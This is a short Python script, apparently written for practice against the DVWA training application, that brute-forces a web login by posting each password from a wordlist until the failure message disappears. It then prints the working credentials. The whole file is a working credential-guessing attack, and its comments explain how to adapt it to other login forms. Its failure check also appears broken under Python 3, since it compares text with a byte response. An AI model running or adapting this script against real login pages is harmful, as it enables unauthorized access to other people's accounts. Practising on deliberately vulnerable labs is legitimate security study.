#!/usr/bin/python
#tested with DVWA

import requests

def bruteforce(username,url):
	for password in passwords:
		password = password.strip()
		print("[!] Trying to Brute Force with Password: " + password)
		#paste the values in the corresponding fields on the login page
		input_dictionary = {"username":username,"password":password,"Login:":"submit"}
		response = requests.post(url,data=input_dictionary)
		#copy-paste the failed login message here
		if "Login failed" in response.content:
			pass
		else:
			print("[+] Username: --> " + username)
			print("[+] Password: --> " + password)
			exit()

page_url = "http://DVWAaddress.here/dvwa/login.php"
username = input("[*] Enter Username: ")

with open("passwordlist.txt", "r") as passwords:
	bruteforce(username,page_url)

print("[!] Password is not in this list.")
